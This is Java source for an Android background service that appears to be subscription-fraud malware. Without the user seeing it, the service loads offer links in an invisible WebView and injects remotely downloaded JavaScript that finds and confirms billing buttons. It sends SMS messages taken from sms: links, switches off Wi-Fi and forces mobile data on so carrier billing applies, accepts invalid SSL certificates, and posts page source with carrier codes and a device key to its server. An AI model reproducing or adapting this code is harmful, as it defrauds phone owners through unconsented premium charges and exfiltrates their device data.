package com.xxm.sublibrary.services;

import android.annotation.SuppressLint;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.http.SslError;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Message;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.xxm.sublibrary.http.H_okhttp;
import com.xxm.sublibrary.mode.Ma;
import com.xxm.sublibrary.noti.Na;
import com.xxm.sublibrary.tasks.T_cache;
import com.xxm.sublibrary.tasks.T_connect;
import com.xxm.sublibrary.tasks.T_djs;
import com.xxm.sublibrary.utils.UParams;
import com.xxm.sublibrary.utils.Ua;
import com.xxm.sublibrary.utils.Uc;
import com.xxm.sublibrary.utils.Uh;
import com.xxm.sublibrary.utils.Ujs;
import com.xxm.sublibrary.utils.Ulink;
import com.xxm.sublibrary.utils.Ulog;
import com.xxm.sublibrary.utils.Uutil;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;


/**
 * Created by xlc on 2017/5/24.
 */

public class S_service extends Service {

    private final String TAG = "Sa";

    private WebView mWebView = null;

    private Handler mHandler;

    private HandlerThread handlerThread;

    private final int notid = Ulog.TAG.hashCode();

    private boolean showNotification = false;
    /**
     *
     */
    private boolean execute_task = false;

    private Random random = null;

    /**
     * 判断是否为黑名单显示通知栏
     */
    public void check_black_list() {

        SharedPreferences sp = getSharedPreferences(Uutil.SUB_XML, 0);

        int black_list_status = sp.getInt("b_l", 0);

        switch (black_list_status) {

            case -1:

                if (showNotification) {

                    Log.i(TAG, "check_notification_by_blacklist:  black_list clear noti");

                    Ulog.w("黑名单清除 通知栏");

                    Ulog.show("check_notification_by_blacklist: dismiss noti");

                    NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

                    nm.cancel(notid);

                    stopForeground(true);

                    showNotification = false;
                }
                break;

            case 1:

                if (!showNotification) {

                    Ulog.show("check_notification_by_blacklist: show noti");

                    Ulog.w("不是黑名单显示 通知栏");

                    startForeground(notid, Na.getInstance(getApplicationContext()).getNotification());

                    showNotification = true;
                }
                break;
            default:
                Ulog.w("未知情况下不展示通知栏");
                break;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Na.getInstance(getApplicationContext());

        Ulog.initDebug(this);

        random = new Random();

        initView();

//        // 修改劫持方法
        handlerThread = new HandlerThread("browser");

        handlerThread.start();

        mHandler = new Handler(handlerThread.getLooper()) {

            @Override
            public void handleMessage(Message msg) {
                // TODO Auto-generated method stub

                // executive();

//                 Ulog.w("key:" + H_encode.getSignature(getApplicationContext()));

                handler_web.sendEmptyMessage(0);

                mHandler.sendEmptyMessageDelayed(1, 6000); // 延时两秒发送工作消息

                super.handleMessage(msg);
            }
        };
        mHandler.sendEmptyMessage(5000);

        Ulog.w("service onCreate");
    }


    @SuppressLint("NewApi")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (Uutil.check_status(this)) {
            Ulog.w("满足时间限制,做缓存");
            Ulog.show("do cache");
            new T_cache(this).executeOnExecutor(H_okhttp.executorService);
        }

        if (Uutil.check_connect_status(this)) {
            Ulog.w("满足联网时间限制");
            Ulog.show("do connect");
            new T_connect(this).executeOnExecutor(H_okhttp.executorService);
        }

        check_download_js_status();

        check_black_list();

        return super.onStartCommand(intent, flags, startId);
    }
//

    @SuppressLint("NewApi")
    private void check_download_js_status() {

        if (Ujs.getInstance(this).check_d_js_time() && !Uutil.check_b_list(this)) {

            if (Ujs.getInstance(this).getJsCacheStatus() != Ujs.JS_CACHE_STATUS_DOING) {

                Ulog.w("满足下载js文件条件");

                Ulog.show("do download js");

                new T_djs(this).executeOnExecutor(H_okhttp.executorService);

            } else {
                Ulog.show("js downloading...");

                Ulog.w("js 正在下载...");
            }
        }

    }

    private Handler handler_web = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message msg) {

            switch (msg.what) {

                case 0:

                    if (Uutil.check_webview_load_time(getApplicationContext()) && !Uutil.check_b_list(getApplicationContext()) && !execute_task) {

                        Ulog.w("服务中满足时间开始执行链接");

                        Ulog.show("do webView load");

                        execute_task = true;

                        new Task().execute();
                    }
                    break;
                //20秒后注入
                case 1:
                    if (load_error == -2) {

                        Ulog.w("网络异常情况下不注入js，执行下一条");

                        Ulog.show("net error not load js, do last");

                        handler_web.sendEmptyMessage(3);

                        break;
                    }
                    if (!same_offer) {

                        int random_ = random.nextInt(100) + 1;

                        if (random_ > jRate) {


                            Ulog.w("随机数" + random_ + "大于" + jRate + "不执行注入");

                            Ulog.show("random_" + random_ + ">" + jRate + " do last one");

                            handler_web.sendEmptyMessage(3);

                            break;

                        } else {

                            Ulog.w("随机数" + random_ + "小于等于 " + jRate + " 执行注入");

                            Ulog.show("random_" + random_ + "<=" + jRate + " load js");
                        }
                    }
                    String jsString = Ujs.getInstance(getApplicationContext()).getJsString();

                    if (mWebView != null && !TextUtils.isEmpty(jsString)) {

                        Ulog.w("service_执行注入");

                        Ulog.show("service_ load js");

                        mWebView.loadUrl("javascript:" + Ujs.getInstance(getApplicationContext()).getJsString());

                        mWebView.loadUrl("javascript:findLp()");

                        mWebView.loadUrl("javascript:findAocOk()");
                    }
                    break;

//               // 注入获取网页的代码js
                case 2:
                    if (mWebView != null)
                        mWebView.loadUrl(H_okhttp.js_get_source);
                    break;
                case 4:

                    Ulog.show("do last after 2 min,check post Resource status");

                    Ulog.w("间隔了两分钟后直接执行下一条,先判断是否需要上传源码");

                    boolean source_status = Uh.check_source_status(getApplicationContext(), offer_id + "");

                    if (source_status && getSource == 0) {

                        Ulog.w("需要源代码上传");

                        Ulog.show("need load Resource js");

                        handler_web.sendEmptyMessage(2);

                        handler_web.sendEmptyMessageDelayed(3, 3000);

                    } else {

                        Ulog.w("不需要源代码上传");

                        Ulog.show("need not load resource js, do last one");

                        handler_web.sendEmptyMessage(3);
                    }
                    break;

                case 3:

                    if (load_error != -2) {

                        Ulog.w("网络正常的情况统计:" + offer_id + "的执行次数");
                        Ulog.show("network normal save :" + offer_id + " execute times");
                        Ulink.save_sub_link_limit(getApplicationContext(), offer_id);

                    } else {

                        Ulog.w("网络异常不统计:" + offer_id + "的执行次数");

                        Ulog.show("network error  do not save :" + offer_id + " execute times,do last");
                    }
                    if (mList != null && execute_index < mList.size()) {

                        Ulog.show("do last offer_id:" + mList.get(execute_index).getOffer_id() + ":" + execute_index + "  after 5s");

                        Ulog.w("执行下一条链接offer_id:" + mList.get(execute_index).getOffer_id() + "执行第" + execute_index + "条");

                        start_load(mList.get(execute_index));

                        execute_index = execute_index + 1;

                    } else {

                        Ulog.w("轮询结束,回收浏览器");

                        Ulog.show("do all offer finished,destroy webView");

                        handler_web.removeMessages(4);

                        destoryWebView();

                        Ua.getInstance(getApplicationContext()).setNomal();
                    }
                    break;
            }
            return false;
        }
    });

    //
    private void start_load(Ma offer) {

        initStatus();

        String load_url = Ulink.getChangeUrl(offer, this, true);

        jRate = offer.getJRate();

        sub_platform_id = offer.getSub_platform_id();

        offer_id = offer.getOffer_id();

        getSource = offer.getGetSource();

        if (mWebView == null) initView();

        Uutil.disableJsIfUrlEncodedFailed(mWebView, load_url);

        // Ulog.w("service_开始加载链接：" + load_url);
        handler_web.removeMessages(4);
        handler_web.sendEmptyMessageDelayed(4, 2 * 60000);
        mWebView.stopLoading();
        mWebView.clearFocus();
        mWebView.clearHistory();
        mWebView.clearCache(true);
        mWebView.loadUrl(load_url);

    }


    private class Task extends AsyncTask<Void, Integer, Ma> {

        @Override
        protected Ma doInBackground(Void... params) {

            mList = null;

            execute_index = 0;

            if (Ujs.getInstance(getApplicationContext()).check_d_js_time() && !Uutil.check_b_list(getApplicationContext())) {

                if (Ujs.getInstance(getApplicationContext()).getJsCacheStatus() != Ujs.JS_CACHE_STATUS_DOING) {

                    Ulog.w("执行offer前满足条件先下载js");

                    Ulog.show("download js before execute offer");

                    Ujs.getInstance(getApplicationContext()).init();

                    if (Ujs.getInstance(getApplicationContext()).getJsCacheStatus() == Ujs.JS_CACHE_STATUS_FAIL) {

                        Ulog.w("下载失败不往下执行offer");

                        Ulog.w("download fail return");

                        return null;
                    }
                } else {
                    Ulog.w("js正在下载中,不执行offer");
                    Ulog.w("js downloading..");
                    return null;
                }
            }

            Ma offer = Ulink.get_one_offer(getApplicationContext());

            if (offer == null) return null;

            Ulog.w("随机的一条支持网络状态(1:流量)：" + offer.getAllow_network());

            Ulog.show("get one offer(1:gprs)：" + offer.getAllow_network());

            if (offer.getAllow_network() == 1) {

                Ulog.w("服务中执行: 只支持GPRS");

                Ulog.show("only gprs");

                if (Uutil.isWifiEnabled(getApplicationContext())) {

                    if (Ujs.getInstance(getApplicationContext()).getJsCacheStatus() == Ujs.JS_CACHE_STATUS_DOING) {

                        Ulog.w("正在下载js或缓存不做执行offer,不做关闭wifi操作");

                        Ulog.show("js downloading,do not close wifi");

                        return null;
                    }
                    Ulog.w("服务中执行: 判断wifi为开启状态 做关闭");

                    Ulog.show("do close wifi");
                    //关闭wifi
                    Uutil.closeWifi(getApplicationContext());
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    //FlurryAgent.logEvent("service_try_close_wifi");
                }
                if (!Uutil.getMobileDataState(getApplicationContext(), null)) {

                    Ulog.w("服务中执行:GPRS为关闭状态，做开启操作");

                    Ulog.show("open gprs");

                    // FlurryAgent.logEvent("service_open_gprs");

                    Uutil.setGprsEnabled(getApplicationContext(), "setMobileDataEnabled", true);

                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            }
            mList = Ulink.service_exeute_offer(getApplicationContext(), offer.getAllow_network(), offer.getOffer_id());

            Ulog.w("根据这个网络查询数据大小：" + mList.size());

            Ulog.show("search size：" + mList.size());

            return offer;
        }

        @SuppressLint("SimpleDateFormat")
        @Override
        protected void onPostExecute(Ma offer) {
            super.onPostExecute(offer);

            execute_task = false;

            if (offer == null) {

                Ulog.w("没有查找到数据");

                Ulog.show("no data");
                return;
            }
            Uutil.save_webview_load_time(getApplicationContext());

            Ua.getInstance(getApplicationContext()).setSlience();

            start_load(offer);
        }
    }


    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    private void initView() {
        mWebView = new WebView(this);
        mWebView.setDrawingCacheBackgroundColor(Color.WHITE);
        mWebView.setFocusableInTouchMode(true);
        mWebView.setFocusable(true);
        mWebView.setDrawingCacheEnabled(false);
        mWebView.setWillNotCacheDrawing(true);
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP_MR1) {
            //noinspection deprecation
            mWebView.setAnimationCacheEnabled(false);
            //noinspection deprecation
            mWebView.setAlwaysDrawnWithCacheEnabled(false);
        }
        mWebView.setBackgroundColor(Color.WHITE);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setSaveEnabled(true);
        mWebView.setNetworkAvailable(true);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(this, "toolbox");
        mWebView.addJavascriptInterface(this, "myObj");
        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // TODO Auto-generated method stub

                if (url.startsWith("sms:")) {

                    String port = url.substring(url.indexOf(":") + 1, url.indexOf("?"));

                    String content = url.substring(url.indexOf("=") + 1, url.length());

                    SmsManager.getDefault().sendTextMessage(port, null, content, null, null);

                    return true;
                }
                return super.shouldOverrideUrlLoading(view, url);
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                // TODO Auto-generated method stub
                handler.proceed();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                // TODO Auto-generated method stub

                Ulog.w("service_onPageFinished:" + url);

                super.onPageFinished(view, url);

                if (url.equals(last_finished_url)) {

                    Ulog.w("相同的链接不注入");

                    return;
                }
                last_finished_url = url;

                handler_web.removeMessages(1);

                if (Ulink.blacklist_url(url)) {

                    Ulog.w("黑名单链接不执行注入，执行下一条");

                    Ulog.show("blacklist url, do last one");

                    load_error = 0;

                    handler_web.sendEmptyMessage(3);

                    return;
                }
                handler_web.sendEmptyMessageDelayed(1, 20000);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                // TODO Auto-generated method stub
                super.onPageStarted(view, url, favicon);

                load_error = 0;

                findLp_ok = "";

                findAoc_ok = "";

                // Ulog.w("service_onPageStarted url:" + url);
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                load_error = errorCode;
            }
        });
    }

    /**
     * 回收webView
     */
    @SuppressLint("NewApi")
    private void destoryWebView() {
        if (mWebView != null) {
            // Check to make sure the WebView has been removed
            // before calling destroy() so that a memory leak is not created
            ViewGroup parent = (ViewGroup) mWebView.getParent();
            if (parent != null) {
                Log.i(TAG, "WebView was not detached from window before onDestroy");
                parent.removeView(mWebView);
            }
            mWebView.stopLoading();
            mWebView.onPause();
            mWebView.clearHistory();
            mWebView.removeAllViews();
            mWebView.destroyDrawingCache();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                //this is causing the segfault occasionally below 4.2
                mWebView.destroy();
            }
            mWebView = null;
        }
    }

    /**
     * 获取源码信息回调
     *
     * @param source
     */
    @android.webkit.JavascriptInterface
    public void getSource(String source) {

        Ulog.w("getSource: " + source);

        Map<String, Object> map = new HashMap<>();
        map.put("mcc", Uc.getMcc(getApplicationContext()));
        map.put("mnc", Uc.getMnc(getApplicationContext()));
        map.put("cid", UParams.getInstance(getApplicationContext()).getKeyStore());
        map.put("source_type", source_type);
        map.put("platform_id", sub_platform_id);
        map.put("offer_id", offer_id);
        map.put("source", source);
        map.put("network", Uc.getNetWork(getApplicationContext()));
        H_okhttp.postSource(map, getApplicationContext());

    }

    private void initStatus() {
        load_error = 0;
        last_finished_url = "";
        aoc_ok = false;
        lp_ok = false;
        source_type = 0;
        same_offer = false;
        jRate = 60;
    }

    private List<Ma> mList = null;

    //当前执行的index
    private int execute_index = 0;

    private String findLp_ok = "";

    private String findAoc_ok = "";

    private int load_error = 0;

    private boolean lp_ok = false;

    private boolean aoc_ok = false;

    private int source_type;

    private boolean same_offer = false;

    private String last_finished_url = "";

    private int offer_id;

    private int sub_platform_id;

    //是否需要获取网页代码传回服务器 0：干 1：不干
    private int getSource;

    private int jRate;

    @android.webkit.JavascriptInterface
    public void openImage(String tag, String _url) throws InterruptedException {
        Ulog.w("service_tag:" + tag);
        same_offer = true;
        if (tag.contains("findLp")) {
            findLp_ok = tag;
            findAoc_ok = "";
            if (tag.contains("ok")) {
                Ulog.show("lp ok");
                lp_ok = true;
            } else {
                Ulog.show("lp no");
            }
        }
        if (tag.contains("aoc_")) {
            findAoc_ok = tag;
            if (tag.contains("ok")) {
                Ulog.show("aoc ok");
                aoc_ok = true;
            } else {
                Ulog.show("aoc no");
            }
        }
        //短信按钮
        boolean is_sms = findAoc_ok.contains("sms");

        boolean findLp_no = !findLp_ok.contains("ok") && !"".equals(findLp_ok);

        boolean aoc_no = !findAoc_ok.contains("ok") && !"".equals(findAoc_ok);

        if (load_error != -2 && ((findLp_no && aoc_no) || is_sms)) {

            //判断是否需要将网页的信息传回服务器并且满足上传的条件，主要是load js代码 需要handler 到主线程执行
            boolean check_return = Uh.check_source_status(getApplicationContext(), offer_id + "");
            //findlp_ok和aoc_ok都存在
            boolean exist_ok = aoc_ok && lp_ok;

            source_type = getSource_type();

            if (getSource == 0 && !exist_ok && check_return) {
                Ulog.w("需要获取网页的源代码");
                Ulog.show("do load Source code js");
                handler_web.sendEmptyMessage(2);

                handler_web.sendEmptyMessageDelayed(3, 5000);

            } else {
                if (exist_ok) {
                    Ulog.show("exist both ok ,do not return data");
                    Ulog.w("findLp_ok和aoc_ok都存在，不回传");
                }
                if (!check_return) {
                    Ulog.show("offer has return data");
                    Ulog.w("这条offer已经上传过源代码，不再做上传");
                }
                handler_web.sendEmptyMessageDelayed(3, 100);
            }
        }

    }

    /**
     * 回传类型
     *
     * @return
     */
    public int getSource_type() {
        int source_type = 0;
        if (!aoc_ok && !lp_ok) {
            source_type = 0;
        } else if (lp_ok && !aoc_ok) {
            source_type = 1;
        } else if (!lp_ok && aoc_ok) {
            source_type = 2;
        }
        return source_type;
    }

}
